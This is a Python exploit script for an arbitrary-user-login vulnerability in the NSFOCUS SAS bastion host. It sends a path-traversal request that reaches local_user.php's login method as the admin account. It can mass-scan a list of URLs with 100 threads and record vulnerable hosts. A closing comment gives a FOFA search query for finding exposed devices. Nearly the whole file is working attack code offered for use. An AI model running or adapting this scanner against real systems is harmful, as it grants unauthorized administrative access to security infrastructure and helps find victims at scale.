import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    api_payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64;rv:91.0)Gecko/20100101Firefox/91.0',
        'Accept': 'text/javascript,text/html,application/xml,text/xml,*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.0.2',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and '200' in response.text:
            print(f"[+]{target} 存在任意用户登录漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(f"{target}存在任意用户登录漏洞\n")
        else:
            print(f"[-]{target} 不存在任意用户登录漏洞")
    except:
        print(f"{target}可能存在任意用户登录漏洞")
if __name__ == '__main__':
    main()

# fofa语句
# body="'/needUsbkey.php?username='"